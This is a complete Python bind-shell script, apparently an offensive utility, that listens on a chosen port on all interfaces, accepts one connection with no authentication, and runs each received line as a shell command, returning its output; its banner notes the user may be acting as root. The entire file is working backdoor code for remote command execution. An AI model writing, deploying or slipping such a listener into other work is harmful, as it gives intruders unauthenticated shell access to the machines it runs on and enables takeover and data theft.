#! /usr/bin/env python3

# author: Nullable

import socket
import subprocess
import argparse

def arg_parse():
	parser = argparse.ArgumentParser()
	parser.add_argument(
		'-p', '--port',
		dest='port',
		required=True,
		help='The port to listen on',
		type=int
	)
	
	args = parser.parse_args()
	
	if args.port is not None:
		return args.port
	
def main():
	listen_port = arg_parse()
	s1 = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
	s1.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR, 1)
	s1.bind(("0.0.0.0", listen_port))
	s1.listen(1)
	c,a = s1.accept()
	c.send('Please, note that the prompt is signed with \'$\' even if you act as root\n'.encode())
	while True:
		c.send('$ '.encode())
		d = c.recv(1024).decode()
		p = subprocess.Popen(
			d, 
			shell=True,
			stdout = subprocess.PIPE,
			stderr = subprocess.PIPE,
			stdin = subprocess.PIPE
		)
		c.sendall(p.stdout.read() + p.stderr.read())
		
if __name__ == '__main__':
	main()
